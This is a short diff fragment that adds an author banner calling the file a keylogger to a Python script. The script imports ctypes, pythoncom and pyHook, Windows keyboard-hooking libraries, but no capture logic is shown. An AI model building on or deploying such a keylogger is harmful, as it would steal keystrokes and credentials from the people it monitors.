@@ -1,3 +1,9 @@
+#####
+####keylogger written by Rainbow-Hacker
+###
+##
+#
+
 from ctypes import *
 import pythoncom
 import pyHook
